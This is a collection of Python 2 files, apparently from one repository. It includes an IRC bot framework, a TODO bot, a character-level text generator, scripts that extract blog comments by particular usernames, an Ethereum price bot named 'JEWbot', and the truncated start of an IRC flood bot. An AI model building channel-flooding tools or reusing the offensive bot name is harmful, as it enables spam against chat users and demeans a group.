            msg = parsed.text.split("\x01ACTION", 1)[1].strip().strip("\x01")
            self.on_private_action_message(nick, hostname, msg)

        # kicked from chan
        elif parsed.type.startswith("404") or parsed.type.startswith("KICK"):
            msg_type = parsed.type.split()
            chan_name = msg_type[1]
            who = msg_type[2]
            msg = parsed.text.split(":")[0]  # TODO: parse kick message

            if who == self.nickname:
                self.on_kick(chan_name, msg)
                del self.chans[chan_name]
            else:
                if msg in self.chans[chan_name]:
                    self.chans[chan_name].remove(msg)
                self.on_somebody_kicked(chan_name, who, msg)

        # somebody joined channel
        elif parsed.type.startswith("JOIN"):
            nick = parsed.nick.split("!")[0].strip()
            try:
                chan_name = parsed.type.split()[1].strip()
            except IndexError:
                chan_name = parsed.text

            if nick != self.nickname:
                if nick not in self.chans[chan_name]:
                    self.chans[chan_name].append(nick)
                    self.on_somebody_joined_chan(chan_name, nick)

        # user renamed
        elif parsed.type == "NICK":
            old_nick = parsed.nick.split("!")[0].strip()

            for chan in self.chans.keys():
                if old_nick in self.chans[chan]:
                    self.chans[chan].remove(old_nick)
                    self.chans[chan].append(parsed.text)

            self.on_user_renamed(old_nick, parsed.text)

        # user leaved the channel
        elif parsed.type.startswith("PART"):
            chan = parsed.type.split()[-1]
            nick = parsed.nick.split("!")[0].strip()

            if nick in self.chans[chan]:
                self.chans[chan].remove(nick)

            self.on_somebody_leaved(chan, nick)

        # user quit the server
        elif parsed.type.startswith("QUIT"):
            nick = parsed.nick.split("!")[0].strip()

            for chan in self.chans.keys():
                if nick in self.chans[chan]:
                    self.chans[chan].remove(nick)

            self.on_somebody_quit(nick)

    def on_nickname_used(self, nickname):
        """
        Callback when `nickname` is already in use.

        Args:
            nickname (str): Used nickname.
        """
        self.rename(nickname + "_")

    def on_server_connected(self):
        """
        Called when bot is successfully connected to the server.

        By default, the +B mode is set to the bot and then bot joins all
        channels defined in :attr:`self.join_list`.
        """
        self._socket_send_line("MODE " + self.nickname + " +B")
        self.join_all()

    def on_joined_to_chan(self, chan):
        """
        Called when the bot has successfully joined the channel.

        Args:
            chan (str): Name fo the channel the bot just joined.
        """
        pass

    def on_somebody_joined_chan(self, chan, who):
        """
        Called when somebody joined the channel you are in.

        Args:
            chan (str): Name fo the channel where the new user arrived.
            who (str): Name of the user who just joined.
        """
        pass

    def on_channel_message(self, chan, who, hostname, msg):
        """
        Called when somebody posted message to a channel you are in.

        Args:
            chan (str): Name of the channel (starts with #).
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_private_message(self, who, hostname, msg):
        """
        Called when somebody send you private message.

        Args:
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_channel_action_message(self, chan, who, hostname, msg):
        """
        Called for channel message with action.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_private_action_message(self, who, hostname, msg):
        """
        Called for private message with action.

        Args:
            who (str): Name of the origin of the message.
            hostname (str): User's hostname - IP address usually.
            msg (str): User's message.
        """
        pass

    def on_user_renamed(self, old_nick, new_nick):
        """
        Called when user renamed himself.

        See :attr:`.chans` property, where user nicknames are tracked and
        stored.

        Args:
            old_nick (str): Old nick used by user.
            new_nick (str): Nick into which user just renamed itself.
        """
        pass

    def on_kick(self, chan, who):
        """
        Called when somebody kicks you from the channel.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Nickname of the user who just kicked the bot.
        """
        time.sleep(5)
        self.join(chan)

    def on_somebody_kicked(self, chan, who, kicked_user):
        """
        Called when somebody kick someone from `chan`.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Nickname of the user who kicked `kicked_user`.
            kicked_user (str): Nickname of the user who was kicked from chan.
        """
        pass

    def on_somebody_leaved(self, chan, who):
        """
        Called when somebody leaved the channel.

        Args:
            chan (str): Name of the channel (starts with #) where the
                event occured.
            who (str): Nickname of the user who just leaved.
        """
        pass

    def on_somebody_quit(self, who):
        """
        Called when somebody leaves the server.

        Args:
            who (str): Nickname of the user who just leaved.
        """
        pass

    def on_select_timeout(self):
        """
        Called every :attr:`self.socket_timeout` seconds if nothing else is
        happening on the socket.

        This can be usefull source of event ticks.

        PS: Ping from server IS considered as something.
        """
        pass

    def on_ping(self, ping_val):
        """
        Called when the server sends PING to the bot. PONG is automatically
        sent back.

        By default, keep track of the :attr:`self.last_ping` and reconnect, if
        the diff is bigger than :attr:`self.default_ping_diff`.

        Attr:
            ping_val (str): Value of the ping message sent from the server.

        See:
            self.last_ping for the timestamp of the last ping.
            self.default_ping_diff for the time considered to be normal ping
                distance.
        """
        now = time.time()

        if now - self.last_ping >= self.default_ping_diff:
            self.quit()
            self.connect()

    def on_quit(self):
        """
        Called when the bot is quitiing the server. Here should be your code
        which takes care of everything you need to do.
        """
        pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Simple TODO IRC bot
by Bystroushaak (bystrousak@kitakitsune.org)
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
# Imports =====================================================================
import os
import json
import time
import os.path
import argparse

from frozenidea2 import FrozenIdea2

from commands import TIME_DIFF
from commands.state_info import StateInfo

from commands.addcommand import add_command
from commands.listcommand import list_command
from commands.removecommand import remove_command
from commands.helpcommand import help_command
from commands.seediffcommand import see_diff_command
from commands.setdiffcommand import set_diff_command


# Variables ===================================================================
DATA_FILE = "todo_data.json"
UNKNOWN_COMMAND = "Unknown command or bad syntax! Type 'help' for help."


# Functions & objects =========================================================
class TODObot(FrozenIdea2):
    def __init__(self, nickname, chans, server, port=6667):
        super(TODObot, self).__init__(nickname, server, port)
        self.join_list = chans
        self.read_data_file()

        def rm_and_list(*args, **kwargs):
            remove_command(*args, **kwargs)

            # remove info.msg to prevent filtering of the listed messages
            info = kwargs.get("info", None)
            if not info:
                info = args[-1]
            info.msg = ""

            list_command(*args, **kwargs)

        self.valid_commands = {
            "list": list_command,
            "ls": list_command,
            "la": list_command,
            "add": add_command,
            "remove": remove_command,
            "rm": rm_and_list,
            "help": help_command,
            "see_diff": see_diff_command,
            "see": see_diff_command,
            "set_diff": set_diff_command,
            "set": set_diff_command,
        }

    def on_quit(self):
        """
        Don't forget to save data on quit.

        Data are also saved periodically after each change.
        """
        self.save_data_file()

    def on_channel_message(self, chan_name, nickname, hostname, msg):
        """React to messages posted to channel."""
        # message for bot
        if msg.startswith(self.nickname + ": "):
            msg = msg.split(" ", 1)[1]
            self.react_to_message(chan_name, nickname, msg)
            return

        # event for ticker
        self.react_to_anything()

    def on_private_message(self, nickname, hostname, msg):
        """React to messages posted to PM."""
        self.react_to_message(nickname, nickname, msg)


    # react_to_anything() callback block
    def on_somebody_leaved(self, chan_name, nick):
        self.react_to_anything()
    def on_somebody_joined_chan(self, chan_name, nick):
        self.react_to_anything()
    def on_channel_join(self, chan_name):
        self.react_to_anything()
    def on_select_timeout(self):
        self.react_to_anything()

    def on_kick(self, chan_name, who):
        time.sleep(1)
        self.join(self.chan)

    def prolong_user(self, username):
        """
        Don't bother user for some time defined in TIME_DIFF.
        """
        self.time_data[username] = time.time()

    def react_to_anything(self):
        """
        Called when certain events occurs:
            .on_somebody_leaved()
            .on_somebody_joined_chan()
            .on_channel_join()
            .on_channel_message()

        Used as ticker, to be able to send user warning about their TODO list
        after some time.
        """
        if self.time_data == {} or self.todo_data == {}:
            return

        # check which users have their TODO ready and warn them
        for username in self.time_data.keys():
            # skip users, which are not in any channel (this prevents bot from
            # posting to usernames, which are currently offline)
            present_usernames = set(sum(self.chans.values(), []))
            if username not in present_usernames:
                continue

            timestamp = int(self.time_data[username])

            # allow users to set their own diff
            diff = TIME_DIFF
            if username in self.diff_data:
                diff = self.diff_data[username]

            if timestamp < time.time() - diff:
                self.zapicuj(username)

    def zapicuj(self, username):
        """
        Send user information about their TODO after some time (see TIME_DIFF).
        """
        num = len(self.todo_data.get(username, []))
        self.send_msg(
            username,
            "You have " + str(num) +
            " item" +
            ("s" if num > 1 else "") +
            " on your TODO list. For listing, type 'list'."
        )
        self.prolong_user(username)

    def _parse_commands(self, message):
        """
        Parse `message` into command and message.

        Returns (command, message) tuple.
        """
        message = message.strip()

        if " " in message:
            return message.split(" ", 1)

        return message, ""

    def send(self, msg):
        """
        .send_msg() wrapper to save some effort and space by automatically
        choosing .msg_to as person to who will be `msg` delivered.

        Used only in .react_to_message().
        """
        self.send_msg(self.msg_to, msg)

    def react_to_message(self, chan, nickname, msg):
        """
        React to user's message send to the bot.

        chan -- message's origin - name of the channel or user's nick in case
                 that message was sent as PM
        nickname -- always name of user which sent the message, no matter of
                     the origin of the message
        msg -- string message
        """
        self.msg_to = nickname  # this is saved for .send()
        msg = msg.strip().replace("\n", "")

        # state info for command classes
        info = StateInfo()
        info.chan = chan
        info.nickname = nickname
        info.private_message = (chan == nickname)
        info.command, info.msg = self._parse_commands(msg)

        if info.command not in self.valid_commands:
            self.send(UNKNOWN_COMMAND)
            return

        # read data
        info.data = self.todo_data.get(nickname, [])
        info.data_len = len(info.data)

        # do the command
        self.valid_commands[info.command](self, info)

        # save the state
        self.save_data_file()

    def read_data_file(self):
        """
        Read data from DATA_FILE, save them into properties .time_data and
        .todo_data (both dicts).
        """
        data = {}
        if os.path.exists(DATA_FILE):
            data = json.load(open(DATA_FILE))

        self.time_data = data.get("time", {})
        self.todo_data = data.get("todo", {})
        self.diff_data = data.get("diff", {})

    def save_data_file(self):
        """
        Save data from .time_data and .todo_data dicts to JSON.
        """
        data = {
            "time": self.time_data,
            "todo": self.todo_data,
            "diff": self.diff_data
        }
        json.dump(data, open(DATA_FILE, "wt"), encoding="unicode_escape")


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='IRC TODObot')
    parser.add_argument(
        "-s",
        '--server',
        type=str,
        help='Address of the IRC server.'
    )
    parser.add_argument(
        "-p",
        '--port',
        type=int,
        default=6667,
        help='Port of the IRC server. Default 6667.'
    )
    parser.add_argument(
        "-n",
        '--nick',
        type=str,
        default="TODObot",
        help="Bot's nick. Default 'TODObot'."
    )
    parser.add_argument(
        'channels',
        metavar='CHANNEL',
        type=str,
        nargs='+',
        help='List of channels for bot to join. With or without #.'
    )
    args = parser.parse_args()

    bot = TODObot(args.nick, args.channels, args.server, args.port)
    bot.verbose = True

    try:
        bot.run()
    except KeyboardInterrupt:
        print "Clean exit."
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import string

from normalize_cz_unicode import normalize


# Command definition ==========================================================
def list_command(obj, info):
    todos = []

    # skip listing of blank files
    if info.data_len == 0:
        obj.send("There is no TODO for you (yet).")
        return

    for line_cnt, line in enumerate(info.data):
        if info.msg and normalize(info.msg) not in normalize(line):
            continue

        todos.append(" #%d: %s" % (line_cnt, normalize(line)))

    amount = len(todos)

    # compose output message from template string
    output_templ = "You have $number TODO$s on your TODO list$match$excl"
    output = string.Template(output_templ).substitute(
        number=str(amount) if amount > 0 else "no",
        s="s" if amount > 1 else "",
        match="" if not info.msg else " with match `" + str(info.msg) + "`",
        excl=":" if amount > 0 else "!"
    )
    obj.send(output)

    obj.send_array(info.nickname, todos)
    obj.prolong_user(info.nickname)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#


# Command definition ==========================================================
def remove_command(obj, info):
    if info.data_len == 0:
        obj.send("There is no TODO for you (yet).")
        return

    if info.msg == "":
        obj.send("`remove` expects index parameter!")
        return

    if info.msg == "*":
        del obj.time_data[info.nickname]
        del obj.todo_data[info.nickname]
        obj.send("All data removed.")
        return

    # convert commands parameter to number
    index = -1
    try:
        index = int(info.msg)
    except ValueError:
        obj.send("`remove` commandPattern expects integer parameter!")
        return

    # check range of `remove` parameter
    if index < 0 or index >= info.data_len:
        obj.send("Bad index!")
        return

    # actually remove todo from todolist
    del obj.todo_data[info.nickname][index]
    obj.send("Item #" + str(index) + " removed.")

    if len(obj.todo_data[info.nickname]) == 0:
        del obj.time_data[info.nickname]
        del obj.todo_data[info.nickname]
    else:
        obj.prolong_user(info.nickname)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

MAX_DATA = 25  # how much items will be stored for one user (warning: flood)
TIME_DIFF = 60 * 60 * 24  # 1 hour (default time diff)
HELP_FILE = "help.txt"  # path to file with help
MIN_TIME_DIFF = 60  # minimal time diff (used to prevent flood kick)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from __init__ import MIN_TIME_DIFF


# Command definition ==========================================================
def set_diff_command(obj, info):
    if info.msg == "":
        obj.send("`set_diff` expects one parameter!")
        return

    # convert commands parameter to number
    index = -1
    try:
        index = int(info.msg)
    except ValueError:
        obj.send("`set_diff` command expects one integer parameter!")
        return

    if index <= 0:
        obj.send("Time diff have to be positive number.")
        return

    if index < MIN_TIME_DIFF:
        obj.send(
            "Min. time diff: " + str(MIN_TIME_DIFF) +
            ". Leaving unchanged."
        )
        return

    obj.diff_data[info.nickname] = index
    obj.send("Time diff updated.")
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#


# Classes =====================================================================
class StateInfo(object):
    def __init__(self):
        self.chan = None
        self.nickname = None
        self.msg = None
        self.private_message = None
        self.command = None
        self.data = None
        self.data_len = None
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os

from __init__ import HELP_FILE


# Command definition ==========================================================
def help_command(obj, info):
    if not os.path.exists(HELP_FILE):
        obj.send("Help file '" + HELP_FILE + "' doesn't exits.")
        obj.send("Please, contact owner of this bot.")
        return

    with open(HELP_FILE) as f:
        obj.send_array(info.nickname, f.read().splitlines())
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from __init__ import TIME_DIFF


# Command definition ==========================================================
def see_diff_command(obj, info):
    if info.nickname not in obj.diff_data:
        obj.send(
            "You didn't set your own time diff. Using default " +
            str(TIME_DIFF) + "s."
        )
        return

    obj.send(
        "Your time diff is set to %ds." % obj.diff_data[info.nickname]
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from __init__ import MAX_DATA


# Command definition ==========================================================
def add_command(obj, info):
    if not info.msg:
        obj.send("Your TODO message is blank!")
        return

    if info.nickname in obj.todo_data:
        if len(obj.todo_data[info.nickname]) >= MAX_DATA:
            obj.send("You can have only " + str(MAX_DATA) + " items!")
            return
        obj.todo_data[info.nickname].append(info.msg)
    else:
        obj.todo_data[info.nickname] = [info.msg]

    obj.send("TODO updated.")
    obj.prolong_user(info.nickname)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
"""
Implementation of the Unsmoothed maximum-liklihood character level language
models.

Details: http://nbviewer.ipython.org/gist/yoavg/d76121dfde2618422139
"""
# Imports =====================================================================
import sys
from random import random
from collections import Counter
from collections import defaultdict


# Variables ===================================================================
# Functions & classes =========================================================
def normalize(counter):
    s = float(
        sum(counter.values())
    )

    return [
        (char, cnt/s)
        for char, cnt in counter.iteritems()
    ]


def train_char_model(data, order=4):
    raw_model = defaultdict(Counter)

    pad = "~" * order
    data = pad + data
    for i in xrange(len(data) - order):
        char = data[i+order]
        history = data[i:i+order]

        raw_model[history][char] += 1

    return {
        hist: normalize(chars)
        for hist, chars in raw_model.iteritems()
    }


def generate_letter(model, history, order):
    history = history[-order:]
    dist = model[history]

    x = random()
    for char, prob in dist:
        x = x - prob
        if x <= 0:
            return char


def generate_text(model, order, nletters=1000):
    history = "~" * order

    out = []
    for i in xrange(nletters):
        c = generate_letter(model, history, order)
        history = history[-order:] + c
        out.append(c)

    return "".join(out)


# Main program ================================================================
if __name__ == '__main__':
    # print train_char_model(sys.stdin.read())
    order = 8
    model = train_char_model(open("dataset.txt").read(), order)
    print generate_text(model, order, nletters=2000)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json

from zconf import get_zeo_key

from misc.normalizator import normalize_comments

from misc.comment_picker import get_all_comments
from misc.comment_picker import convert_to_dicts


# Variables ===================================================================
# Functions & classes =========================================================
def get_normalized_comments():
    comments = convert_to_dicts(
        get_all_comments(get_zeo_key("blogposts"))
    )

    return normalize_comments(comments)


def comments_to_text(comments):
    return "\n\n".join(
        "\n\n".join(
            line.strip()
            for line in comment["text"].splitlines()
            if line.strip()
        )
        for comment in comments
    )


def to_json(data):
    return json.dumps(
        data,

        indent=4,
        separators=(',', ': ')
    )


# Main program ================================================================
if __name__ == '__main__':
    # print to_json(list(get_normalized_comments()))
    print comments_to_text(get_normalized_comments())
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os.path

import ZODB.config
from ZODB import DB
from persistent.mapping import PersistentMapping


# Variables ===================================================================
PROJECT_KEY = "abclinuxu"


# Functions & classes =========================================================
def get_zeo_connection():
    path = os.path.join(os.path.dirname(__file__), "zeo_client.conf")

    # check whether there is zeo_client conf in user's home directory
    home_conf_path = os.path.expanduser("~/zeo_client.conf")
    if os.path.exists(home_conf_path):
        path = home_conf_path

    db = DB(
        ZODB.config.storageFromFile(open(path))
    )
    return db.open()


def get_zeo_root():
    conn = get_zeo_connection()
    dbroot = conn.root()

    if PROJECT_KEY not in dbroot:
        from BTrees.OOBTree import OOBTree
        dbroot[PROJECT_KEY] = OOBTree()

    return dbroot[PROJECT_KEY]


def get_zeo_key(key, new_obj=PersistentMapping):
    root = get_zeo_root()

    if not root.get(key, None):
        root[key] = new_obj()

    return root[key]
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from zconf import get_zeo_key


# Variables ===================================================================
known_unregistered_usernames = set([
    "SSK",
    "SKK",
    "Z.z.",
    "Z. z.",
    "435/2001",
    "435/2001 Z. z.",
    "435/2001 Z.z.",
    "patentovy zakon",
    "whistleblower",
    "flhkewozwnzssah"
])

known_registered_usernames = set([
    "patentovyzakon",
])


# Functions & classes =========================================================
def in_unregistered(comment):
    return not comment.registered and \
           comment.username.lower() in known_unregistered_usernames


def in_registered(comment):
    return comment.registered and \
           comment.username.lower() in known_registered_usernames


def patentovy(comment):
    return not comment.registered and "435/2001" in comment.username


def username_picker(comments):
    for comment in comments:
        if not comment.censored and (in_registered(comment) or
                                     in_unregistered(comment) or
                                     patentovy(comment)):
            yield comment


def get_all_comments(blogposts):
    for blogpost in blogposts.values():
        if not blogpost.comments:
            continue

        for comment in username_picker(blogpost.comments):
            yield comment


def convert_to_dicts(comments):
    return [
        {
            "nick": comment.username,
            "url": comment.url,
            "text": comment.text,
            "date": comment.timestamp,
        }
        for comment in comments
    ]


# Main program ================================================================
if __name__ == '__main__':
    import json

    blogposts = get_zeo_key("blogposts")

    print json.dumps(
        convert_to_dicts(
            get_all_comments(blogposts)
        ),

        indent=4,
        separators=(',', ': ')
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from zconf import get_zeo_key


# Variables ===================================================================
# Functions & classes =========================================================
def pick_unregistered(comments):
    return [
        comment
        for comment in comments
        if not comment.registered
    ]


def i_was_the_poster(comment):
    if not comment.registered or not comment.username:
        return False

    return comment.username.lower() == "bystroushaak"


def people_i_talked_with(blogposts):
    for blog in blogposts.values():
        for comment in blog.comments:
            if i_was_the_poster(comment):
                responses = pick_unregistered(comment.responses)

                previous = []
                if comment.response_to:
                    previous = pick_unregistered([comment.response_to])

                for resp in responses + previous:
                        yield resp



# Main program ================================================================
if __name__ == '__main__':
    blogposts = get_zeo_key("blogposts")

    for cmnt in people_i_talked_with(blogposts):
        print cmnt.username, cmnt.url
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
from zconf import get_zeo_key

import comment_picker


# Variables ===================================================================
def convert_to_dicts(comments):
    return [
        {
            "previous": comment.response_to.text if comment.response_to else "",
            "text": comment.text,
        }
        for comment in comments
        # if comment.response_to
    ]


# Main program ================================================================
if __name__ == '__main__':
    import sys
    import json

    blogposts = get_zeo_key("blogposts")

    print json.dumps(
        convert_to_dicts(
            comment_picker.get_all_comments(blogposts)
        ),

        indent=4,
        separators=(',', ': ')
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import dhtmlparser


# Variables ===================================================================
# Functions & classes =========================================================
def remove_blockquotes(dom):
    for bq in dom.find("blockquote"):
        bq.replaceWith(dhtmlparser.HTMLElement(""))


def get_next_tag(el):
    after = el.endtag if el.endtag else el

    if after not in el.parent.childs:
        return None

    el_index = el.parent.childs.index(after)
    elements = el.parent.childs[el_index:]

    while elements:
        next_el = elements.pop(0)

        if not next_el.isTag() or next_el.isEndTag():
            continue

        if next_el != after:
            return next_el

    return None


def remove_old_quotes(dom):
    """
    She sometimes uses ``<i>`` followed by separator instead of
    ``<blockquote>``.
    """
    for i in dom.find("i") + dom.find("em"):
        next_tag = get_next_tag(i)

        if next_tag and next_tag.getTagName() == "p" and \
           next_tag.params.get("class", "") == "separator":
            i.replaceWith(dhtmlparser.HTMLElement(""))
            next_tag.replaceWith(dhtmlparser.HTMLElement(""))


def remove_separators(dom):
    """
    ``<p class="separator">`` -> ``\\n``.
    """
    for p in dom.find("p", {"class": "separator"}):
        p.replaceWith(dhtmlparser.HTMLElement("\n"))


def normalize_comment(post):
    try:
        text = post["text"].encode("utf-8")
    except UnicodeDecodeError:
        text = post["text"]

    parsed = dhtmlparser.parseString(text)
    dhtmlparser.makeDoubleLinked(parsed)

    remove_blockquotes(parsed)
    remove_old_quotes(parsed)
    remove_separators(parsed)
    text = dhtmlparser.removeTags(parsed)

    text = text.replace('"', " ")

    post["text"] = text.strip()
    return post


def normalize_comments(posts):
    return (normalize_comment(post) for post in posts)


# Main program ================================================================
if __name__ == '__main__':
    import json

    with open("slovenska_ucitelka.json") as f:
        data = f.read()

    posts = json.loads(data)

    with open("slovenska_ucitelka_norm.json", "w") as f:
        f.write(
            json.dumps(
                normalize_comments(posts),

                indent=4,
                separators=(',', ': ')
            )
        )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import json

from zconf import get_zeo_key


# Variables ===================================================================
# Functions & classes =========================================================
def i_was_the_poster(comment):
    if not comment.registered or not comment.username:
        return False

    return comment.username.lower() == "bystroushaak"


def people_i_talked_with(blogposts):
    for blog in blogposts.values():
        if not blog.comments:
            continue

        for comment in blog.comments:
            if i_was_the_poster(comment):
                yield comment


def convert_to_dicts(comments):
    return [
        {
            "nick": comment.username,
            "url": comment.url,
            "text": comment.text,
            "date": comment.timestamp,
        }
        for comment in comments
    ]



# Main program ================================================================
if __name__ == '__main__':
    blogposts = get_zeo_key("blogposts")

    print json.dumps(
        convert_to_dicts(
            people_i_talked_with(blogposts)
        ),

        indent=4,
        separators=(',', ': ')
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
# 
# Imports =====================================================================
import time
import argparse
from functools import wraps

import requests
import dhtmlparser
from retrying import retry

from frozenidea import FrozenIdea


# Parser ======================================================================
@retry(stop_max_attempt_number=3, wait_fixed=2000, stop_max_delay=7000)
def parse_price():
    # TODO: https://poloniex.com/public?command=returnTicker
    # USDT_ETH key
    r = requests.get("http://coinmarketcap.com")

    dom = dhtmlparser.parseString(r.text.encode("utf-8"))
    eth_tag = ["tr", {"id": "id-ethereum"}]

    # price
    price_tags = dom.match(
        eth_tag,
        ["a", {"href": "/currencies/ethereum/#markets", "class": "price"}]
    )
    price = float(price_tags[0].params["data-usd"])

    # change
    change_tags = dom.match(
        eth_tag,
        ["td", None, lambda x: "percent-24h" in x.params.get("class", "")]
    )
    change = float(change_tags[0].params["data-usd"])

    return price, change


def once_in_n_seconds(seconds, alt_val=None):
    def once_in_n_seconds_wrapper(fn):
        last_time = [0]

        @wraps(fn)
        def once_in_n_seconds_decorator(*args, **kwargs):
            if time.time() - last_time[0] < seconds:
                return alt_val

            last_time[0] = time.time()
            return fn(*args, **kwargs)

        return once_in_n_seconds_decorator

    return once_in_n_seconds_wrapper


# Bot definition ==============================================================
class JEWbot(FrozenIdea):
    def __init__(self, nickname, chans, server, port=6667):
        super(self.__class__, self).__init__(nickname, server, port)
        self.join_list = chans

        self.last_shill = 0
        self.last_price = 0

        self.shill_ts_diff = 60 * 60
        self.shill_price_diff = 0.25

        self.socket_timeout = 10

    def on_channel_message(self, chan_name, nickname, hostname, msg):
        """React to messages posted to channel."""
        # message for bot
        if msg.startswith(self.nickname + ":"):
            msg = msg.split(":", 1)[1]
            self.react_to_message(chan_name, nickname, msg)
            return

        # event for ticker
        self.react_to_anything()

    def on_private_message(self, nickname, hostname, msg):
        """React to messages posted to PM."""
        self.react_to_message(nickname, nickname, msg)

    def on_joined_to_chan(self, chan):
        super(self.__class__, self).on_joined_to_chan(chan)
        self.last_price = self.shill(to=chan)
        self.last_shill = time.time()

    # react_to_anything() callback block
    def on_somebody_leaved(self, chan, nick):
        super(self.__class__, self).on_somebody_leaved(chan, nick)
        self.react_to_anything()

    def on_somebody_joined_chan(self, chan, nick):
        super(self.__class__, self).on_somebody_joined_chan(chan, nick)
        self.react_to_anything()

    def on_select_timeout(self):
        super(self.__class__, self).on_select_timeout()
        self.react_to_anything()

    def on_kick(self, chan, who):
        super(self.__class__, self).on_kick(chan, who)
        self.react_to_anything()

    def on_ping(self, ping_val):
        super(self.__class__, self).on_ping(ping_val)
        self.react_to_anything()

    @once_in_n_seconds(5 * 60)
    def react_to_anything(self):
        """
        Called when certain events occurs:
            .on_kick()
            .on_ping()
            .on_channel_join()
            .on_select_timeout()
            .on_somebody_leaved()
            .on_somebody_joined_chan()

        Used as ticker, to be able to send user warning about their TODO list
        after some time.
        """
        # sometimes, ping comes before the bot is joined, so don't shill if
        # not connected to any channel
        if not self.chans:
            return

        # check whether it was an self.shill_ts_diff long sice last shill
        if time.time() - self.last_shill >= self.shill_ts_diff:
            try:
                self.last_price = self.shill()
                self.last_shill = time.time()
            except Exception as e:
                self.last_shill += 5 * 60  # Five minutes
                print str(e.message)
            return

        # and also check how much the price changed and shill if changed too
        # much
        try:
            price, change = parse_price()
        except Exception as e:
            print str(e.message)
            return

        if abs(self.last_price - price) > self.shill_price_diff:
            self.last_price = self.shill(price_tuple=(price, change))
            self.last_shill = time.time()

    def react_to_message(self, chan, nickname, msg):
        msg = msg.strip().replace("\n", "")

        try:
            self.shill(to=nickname)
        except Exception as e:
            print str(e.message)
            self.send_msg(
                to=nickname,
                msg="Sorry, couldn't parse coinmarketcap."
            )

    def shill(self, to=None, price_tuple=()):
        print "shilling to %s" % str(to)

        if price_tuple:
            price, change = price_tuple
        else:
            price, change = parse_price()

        msg = "Current price: %.2f$/ETH. "
        msg += "Last hour price: %.2f. 24h change: %.2f%%."
        msg = msg % (price, self.last_price, change)

        if to:
            self.send_msg(to, msg)
        else:
            for chan in self.chans.keys():
                self.send_msg(chan, msg)

        return price


# Main program ================================================================
if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Ethereum tracking bot.')
    parser.add_argument(
        "-s",
        '--server',
        type=str,
        help='Address of the IRC server.'
    )
    parser.add_argument(
        "-p",
        '--port',
        type=int,
        default=6667,
        help='Port of the IRC server. Default 6667.'
    )
    parser.add_argument(
        "-n",
        '--nick',
        type=str,
        default="JEWbot",
        help="Bot's nick. Default 'JEWbot'."
    )
    parser.add_argument(
        "-q",
        "--quiet",
        action="store_true",
        help="Be quiet."
    )
    parser.add_argument(
        'channels',
        metavar='CHANNEL',
        type=str,
        nargs='+',
        help='List of channels for bot to join. With or without #.'
    )
    args = parser.parse_args()

    bot = JEWbot(args.nick, args.channels, args.server, args.port)
    bot.verbose = not args.quiet

    try:
        bot.run()
    except KeyboardInterrupt:
        print "Clean exit."
#! /usr/bin/env python
# -*- coding: utf-8 -*-
"""
Simple IRC floodbot
by Bystroushaak (bystrousak@kitakitsune.org)
"""
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
# Imports =====================================================================
import os
import json
import time
import random
import os.path
import argparse

from frozenidea import FrozenIdea


# Variables ===================================================================


# Functions & objects =========================================================
class FloodBot(FrozenIdea):
    def __init__(self, nickname, chans, server, pause, port=6667, flood=[]):
        super(self.__class__, self).__init__(nickname, server, port, _ssl=True)
        self.flood = flood
        self.join_list = chans
        self.pause = pause
        self.socket_timeout = pause / 3.0

        self._last_flood = time.time()

    def on_channel_message(self, chan_name, nickname, hostname, msg):
        self.react_to_anything()

    # react_to_anything() callback block
    def on_somebody_leaved(self, chan_name, nick):
        self.react_to_anything()
    def on_somebody_joined_chan(self, chan_name, nick):
        self.react_to_anything()
    def on_channel_join(self, chan_name):
        self.react_to_anything()
    def on_select_timeout(self):
        self.react_to_anything()
    def on_channel_message(self, chan, who, hostname, msg):
        self.react_to_anything()
    def on_private_message(self, who, hostname, msg):
        self.react_to_anything()
    def on_channel_action_message(self, chan, who, hostname, msg):
        self.react_to_anything()
    def on_select_timeout(self):
